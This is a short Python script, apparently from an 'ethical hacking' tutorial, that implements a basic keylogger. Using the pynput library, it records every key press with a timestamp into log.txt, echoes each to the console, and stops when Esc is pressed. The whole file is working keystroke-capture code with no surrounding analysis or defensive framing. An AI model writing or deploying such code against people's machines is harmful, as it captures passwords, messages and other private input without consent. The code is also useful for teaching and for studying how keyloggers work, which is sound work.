#Python For Ethical Hacking
#Python Keylogger
import pynput
from pynput.keyboard import Key,Listener
import datetime

def on_press(key):
	try:
		time = str(datetime.datetime.now())
		file = open('log.txt','a+')
		keyLog = '{1}   -->   {0} - Pressed'.format(key,time)
		file.write(keyLog)
		print(keyLog)
		#file.close()
	except IOError as ioerr:
		print('Tool Error: '+str(ioerr))
		return(None)

def on_release(key):
	#pass
	print('{0} released'.format(key))
	if key == Key.esc:
		#stop listener
		return False

with Listener(on_press=on_press,on_release=on_release) as listener:
	listener.join()

